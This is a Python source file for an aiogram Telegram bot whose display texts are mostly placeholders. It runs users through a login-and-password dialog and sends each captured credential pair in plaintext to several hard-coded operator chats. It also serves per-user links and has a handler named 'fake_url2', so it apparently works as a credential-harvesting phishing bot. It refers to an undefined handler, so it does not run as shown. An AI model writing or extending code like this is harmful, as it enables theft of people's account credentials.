import logging
import os
import time

from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram_dialog.widgets.kbd import Button, SwitchTo
from dotenv import load_dotenv
from random import randint

from aiogram.types import ContentType, Message, CallbackQuery, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton
from aiogram import Bot
from aiogram_dialog import Dialog, Window, DialogManager
from aiogram_dialog.widgets.input import MessageInput
from aiogram_dialog.widgets.text import Const
from aiogram.utils.markdown import hlink

from BOT import bot

from . import states

from parse_data import insert_user, is_user_exist

load_dotenv()

CHAT_ID = [5555555, 5555555, 5555555]

alphabet = {"а", "б", "в", "г", "д", "е", "ё", "ж", "з", "и", "й", "к", "л", "м", "н", "о",
            "п", "р", "с", "т", "у", "ф", "х", "ц", "ч", "ш", "щ", "ъ", "ы", "ь", "э", "ю", "я"}


async def send_message(message, chat_id):
    operator = Bot(token=os.getenv("TOKEN"))
    await operator.send_message(chat_id, message)


async def dialog_get_data(dialog_manager: DialogManager, **kwargs):
    user_id = kwargs.get('event_from_user').id
    data = {
        'user_id': user_id,
        'login': dialog_manager.dialog_data.get('login'),
        'password': dialog_manager.dialog_data.get('password'),
    }

    return data


async def url2(callback: CallbackQuery, button: Button,
                    manager: DialogManager):
    md5 = manager.start_data.get('md5')
    text = '''
❗❗❗
test
'''
    await callback.message.answer(text)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="https://example.com/" + str(md5), url="https://example.com/" + str(md5))
    )

    await callback.message.answer(
        'Перейдите по ссылке: 👇👇👇',
        reply_markup=builder.as_markup(),
    )

    await callback.message.answer(
        f'<a href="https://example.com/{str(md5)}">https://example.com/{str(md5)}</a>',
        parse_mode="HTML", disable_web_page_preview=True)


async def fake_url2(callback: CallbackQuery, button: Button,
                    manager: DialogManager):
    text = '''
❗❗❗
test
'''
    await callback.message.answer(text)

    await callback.message.answer('test')

    await manager.switch_to(state=states.test.LOGIN)


def check_ru_sign(text: str):
    return True if bool(set(alphabet).intersection(set(text.lower()))) else False


async def login_input(message: Message, message_input: MessageInput,
                      manager: DialogManager):
    login = message.text
    if login == '' or check_ru_sign(login) is True or len(login) < 5:
        await manager.switch_to(state=states.test.NOVALIDLOGIN)
    else:
        manager.dialog_data['login'] = login
        await manager.switch_to(state=states.test.PASS)


async def password_input(message: Message, message_input: MessageInput,
                         manager: DialogManager):
    manager.dialog_data['user_id'] = message.from_user.id
    password = message.text
    if password == '' or len(password) < 5:
        await manager.switch_to(state=states.test.NOVALIDPASSWORD)
    else:
        manager.dialog_data['password'] = password

        if not is_user_exist(manager.dialog_data):
            insert_user(manager.dialog_data)

            login = manager.dialog_data.get('login')
            password = manager.dialog_data.get('password')

            msg = f'В боте зарегался новый пользюк: {login} : {password}'

            # await bot.send_message(chat_id=CHAT_ID[0], text=msg)
            for chat_id in CHAT_ID:
                await bot.send_message(chat_id=chat_id, text=msg)

            await manager.start(state=states.test.FINISH)
        else:
            await manager.start(state=states.MainState.ERRORMAIN)


auth_dialog_1 = Dialog(

    Window(
        Const('test\n'),
        Const('test'),
        Button(
            Const("test"),
            id="test1",  # id is used to detect which button is clicked
            on_click=url2,
        ),
        SwitchTo(
            Const("ТОР"),
            id="union",  # id is used to detect which button is clicked
            on_click=test,
            state=states.test.LOGIN
        ),
        state=states.test.MAIN,
    ),
    Window(
        Const(' ❗❗❗ test❗❗❗'),
        MessageInput(login_input, content_types=[ContentType.TEXT]),
        state=states.test.LOGIN,
    ),

    Window(
        Const('test'),
        MessageInput(password_input, content_types=[ContentType.TEXT]),
        state=states.test.PASS,
    ),

    Window(
        Const(
            'test'),
        MessageInput(login_input, content_types=[ContentType.TEXT]),
        state=states.test.NOVALIDLOGIN,
    ),

    Window(
        Const('test'),
        MessageInput(password_input, content_types=[ContentType.TEXT]),
        state=states.test.NOVALIDPASSWORD,
    ),
    Window(
        Const(f'test'),
        state=states.test.FINISH,
    ),
    getter=dialog_get_data,
)
